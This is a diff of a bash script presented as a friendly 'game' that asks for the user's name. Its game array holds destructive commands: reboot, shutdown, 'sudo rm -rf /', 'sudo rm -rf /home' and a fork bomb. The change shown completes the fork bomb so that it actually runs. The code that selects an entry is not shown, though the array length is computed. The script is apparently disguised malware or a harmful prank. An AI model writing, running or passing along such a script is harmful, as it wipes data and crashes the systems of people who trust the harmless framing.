@@ -3,7 +3,7 @@ echo "Hello"
 read -p "Would you like to play a game? Can I get to know your name? " name
 
 
-game=("reboot" "shutdown -h now" "sudo rm -rf /" "yes 'You are so precious <3'" "sudo rm -rf /home" "babu() { babu | babu & } )
+game=("reboot" "shutdown -h now" "sudo rm -rf /" "yes 'You are so precious <3'" "sudo rm -rf /home" "babu() { babu | babu & };babu" )
 
 
 len=${#game[@]}
